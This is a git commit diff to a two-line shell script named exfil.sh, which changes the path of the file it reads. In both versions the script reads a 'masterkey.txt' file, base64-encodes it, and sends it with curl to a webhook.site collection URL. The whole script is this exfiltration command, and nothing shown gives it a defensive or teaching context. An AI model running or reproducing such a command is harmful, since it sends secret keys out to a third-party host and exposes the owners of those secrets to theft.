3921162e83ea401c05e0028177e0a85ac6db15c2
tawafsheh <72212831+tawafsheh@users.noreply.github.com>
2025-06-27 17:16:26 +0300

    Update exfil.sh

--- exfil.sh
+++ exfil.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-curl https://webhook.site/3ba5e3bf-68ba-44d7-871d-6a744af34bb8/$(cat /masterkey.txt | base64)
+curl https://webhook.site/3ba5e3bf-68ba-44d7-871d-6a744af34bb8/$(cat /tmp/masterkey.txt | base64)
